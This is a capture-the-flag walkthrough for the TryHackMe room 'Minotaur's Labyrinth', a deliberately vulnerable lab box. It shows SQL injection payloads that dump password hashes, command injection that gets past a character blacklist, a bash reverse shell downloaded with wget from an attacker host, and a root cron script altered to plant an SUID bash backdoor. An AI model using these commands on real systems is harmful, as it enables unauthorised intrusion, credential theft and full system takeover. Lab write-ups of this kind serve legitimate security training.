# Try Hack Me - Minotaur's Labyrinth

**Categories:** Security, web, linux, injection  
**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP (`export IP=10.10.248.53`) in place of the target machine's IP address.

This box has two paths - one path to root the box, one path to gather enough information to find all the flags. This walkthrough will go through the path required to find the flags, pointing out sections that can be skipped when rooting the box.

## 1. Enumeration 1 - rustscan, nmap

Having launched the machine, we run rustscan followed by an nmap version scan of the 4 discovered ports (21, 80, 443, 3306) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ sudo nmap $IP -p21,80,443,3306 -sV
...snip....
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
3306/tcp open  mysql?
```

nmap does not find the version for ProFTPD and the service on 3306. Connecting to the FTP service shows that the version is not revealed in the banner and that anonymous login is permitted. Connecting to the probable MySql service on 3306 (`mysql -h $IP`) returns an error message - remote hosts are not allowed to connect to the MariaDB server.

A google / searchsploit search for the discovered httpd/OpenSSL versions finds no relevant vulnerabilities.

## 2. Enumeration 2 - curl, gobuster

Curling the application on 80 (which is the same as the application on 443) reveals a "User Pannel" page that includes some kind of search interface (and a comment from the administrator) :

```html
...snip...
<div class="col-sm-6">
    <div class="form-group" id="select fields">
        <label>Choose table:</label>
        <select name="theComboBox" id="theComboBox">
            <option>People</option> 
            <option>Creatures</option>
        </select>
        <br>
        <label for="selectlist">namePeople/nameCreature:</label>
        <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
        <input type="" name="" id="name-input-field" class="form-control">
    </div>
    <button class="btn btn-secondary" id="btn-choose-name">
        Search  
    </button>
</div>
...snip...
```

This "User Pannel" page is returned with a 302 and redirects immediately to a `login.html` page in the browser. As we don't currently have credentials for this page, we continue enumeration with a gobuster scan using dirbuster's medium wordlist, searching for directories and .php files. As all routes are directed to the `login.html` page, we need to user the "--exclude-length" flag to remove this page from the results :

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --exclude-length 3562 -x php 
...snip...
/login.php            (Status: 200) [Size: 3]
/css                  (Status: 301) [Size: 232] [--> http://10.10.248.53/css/]
/imgs                 (Status: 301) [Size: 233] [--> http://10.10.248.53/imgs/]
/js                   (Status: 301) [Size: 231] [--> http://10.10.248.53/js/]  
/api                  (Status: 301) [Size: 232] [--> http://10.10.248.53/api/] 
/logout.php           (Status: 302) [Size: 0] [--> login.html]
/logs                 (Status: 301) [Size: 233] [--> http://10.10.248.53/logs/]
/session.php          (Status: 302) [Size: 3] [--> login.html]
/phpmyadmin           (Status: 403) [Size: 1189]
/echo.php             (Status: 302) [Size: 1278] [--> login.html]
```

Only the `echo.php` route is required to provide a foothold on the box (you can skip to section 4 if you're not interested in the room's flags). We'll go back to these discoveries after going through the FTP service.

## 3. FTP - information disclosure

The room's first flag is inside a hidden directory `/pub/.secret` available on the FTP server. The server also contains a file `message.txt` that reveals possible usernames (daedalus, minotaur) and reminds us to focus on enumeration, and a file `keep_in_mind.txt` that tells us that that the administrator is forgetful and uses "timers" to help their memory. None of this information is required to root the box.

## 4. /logs/post_logs/ - credential disclosure

Navigating to the `/api/` route discovered by gobuster reveals a number of .php files related to the "User Pannel" discovered in section 1, but these provide no additional information on the application.

The `/logs/` route reveals a single file `/logs/post/post_log.log` which is a testing artefact - a HTTP request to a local test version of the `login.php` page including plaintext credentials : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/logs/post/post_log.log
POST /minotaur/minotaur-box/login.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 36
...snip...
email=Daedalus&password=PASSWORD
```

The same credentials are also available at a second location discovered by gobuster - in good old CTF fashion, they are included in an "obfuscated" array at `/js/login.js`.

## 5. "User Pannel" - sqli, credential disclosure, sqlmap

As we saw in section 2, the "User Pannel" page provides some kind of interface for querying the application database. Using the search team "'" causes a 500 error, indicating that the field is injectable (we add a cookie taken from the browser to the curl request because the `/api/` endpoint requires authentication) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/api/people/search -d "namePeople='" -H "Cookie: PHPSESSID=uoa154tu9iqnqn4krneopu1n83" -v
...snip...
* HTTP 1.0, assume close after body
< HTTP/1.0 500 Internal Server Error
```

Repeating the request with a simple injection dumps the table corresponding to the endpoint (people or creatures), including names and MD5 password hashes : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/api/people/search -d "namePeople=' OR '1'='1" -H "Cookie: PHPSESSID=uoa154tu9iqnqn4krneopu1n83" -v
...snip...
* Connection #0 to host 10.10.248.53 left intact
[[{"idPeople":"1","namePeople":"Eurycliedes","passwordPeople":"42354020b68c7ed28dcdeabd5a2baf8e"},{"idPeople":"2","namePeople":"Menekrates","passwordPeople":"0b3bebe266a81fbfaa79db1604c4e67f"},{"idPeople":"3","namePeople":"Philostratos","passwordPeople":"b83f966a6f5a9cff9c6e1c52b0aa635b"},{"idPeople":"4","namePeople":"Daedalus","passwordPeople":"b8e4c23686a3a12476ad7779e35f5eb6"},{"idPeople":"5","namePeople":"M!n0taur","passwordPeople":"1765db9457f496a39859209ee81fbda4"}]] 
```

The previously discovered comments on the page and in the FTP server indicate that the minotaur user (stylised here as "M!n0taur") may be an administrator. The second room flag requires cracking their hash found in the above injection and connecting to the "User Pannel" as minotaur - the flag will be shown in the navbar at the top of the page, along with a link to a "Secret Stuff" page that leads to the previously discovered `echo.php` route.

Having discovered the injectable field, the request can be passed to sqlmap to dump the entire database (which only contains the discovered "people" and "creature" tables) and to read files on the host system - attempting to write a web shell using sqlmap's "--os-shell" feature fails, presumably due to permissions on the web root directory.

## 6. Foothold - command injection, RCE

None of the previous steps (credentials, injectable fields, 2nd flag, etc.) are required to get a foothold on the box. When attempting to access the `/echo.php` route in the browser without authentication causes a 302 redirect to `/login.html`, but given that curl does not automatically follow redirects, we can easily interact with the page without the previously discovered credentials. Curling `/echo.php` we find an interface to "echo" text to the page, with user input being is sent back to the `/echo.php` page as a "?search" query param : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/echo.php?search=here+is+the+user+input
...snip...
<div>here is the user input</div>
```

It's not really clear why any imaginable implementation of this feature would constitute a command injection vulnerability, but the reflected user input, the "echo" name and the "Secret Stuff" link makes this smells like a set-up for a CTF-style command injection vulnerability. Attempting to add shell metacharacters to the provided input leads to a message being shown on the page, implying that some sort of blacklist / whitelist is applied to filter these characters and indicating that this input may well be passed to call to system(), exec(), etc. (the leading "\" is required to tell our shell that the ";" character is part of the query param passed to curl) :

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/echo.php?search=with+metachars+\;id
...snip...
<div class='col-md-5 col-md-offset-4 centered'>You really think this is gonna be possible i fixed this @Deadalus -_- !!!? </div> 
```

Testing a few other metacharacters ($, &, `, etc.) reveals that the pipe character is not included in the blacklist, allowing for command injection and providing RCE :

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/echo.php?search=this+works\|id
...snip...
<div>uid=1(daemon) gid=1(daemon) groups=1(daemon)</div>
```

Getting a one-liner reverse shell past the character blacklist is a hassle, so we can just create a simple bash reverse shell  (`bash -i >& /dev/tcp/ATTACK-IP/80 0>&1`), host it on the attack machine, and download it to the target using wget, saving it in `/tmp/rs.sh` :

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/echo.php?search=\|wget+ATTACK-IP/rs.sh+-O+/tmp/rs.sh
```

After staring a listener, we execute the shell at `/tmp/rs.sh` and it connects home : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ curl $IP/echo.php?search=\|bash+/tmp/rs.sh
```

```console
┌──(kali㉿kali)-[~/Documents/tthm/minotaur]
└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.248.53] 44720
daemon@labyrinth:/opt/lampp/htdocs$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

The user flag is at `/user/user.txt`.

## 7. Privesc, deamon -> root - cronjob 

Catting `/etc/passwd` shows 1 non-system, non-root user minotaur, but the previously discovered credentials do not allow us to switch to the minotaur user. Manual enumeration of the box finds two unusual directories in the root, `/timers` and `/reminders`. `/timers` includes a globally writeable script `timer.sh` that writes output to `/reminders/dontforget.txt`. Looking at the permissions for `/reminders/dontforget.txt`, we see that it is owned by root and is updated every minute :

```console
daemon@labyrinth:/opt/lampp/htdocs$ ls -l /reminders
total 40
-rw-r--r-- 1 root root 32850 nov    7 20:01 dontforget.txt
```

Presumably then a cronjob runs `/timers/timer.sh` as root once a minute. As the script is writeable, we can simply add a line that copies an SUID bash binary into temp, providing a persistent root shell :

```console
daemon@labyrinth:/opt/lampp/htdocs$ echo "cp /bin/bash /tmp/backdoor && chmod u+s /tmp/backdoor" >> /timers/timer.sh
daemon@labyrinth:/opt/lampp/htdocs$ /tmp/backdoor -p
/tmp/backdoor -p
whoami
root
```

The root flag is at `/root/root.txt`.
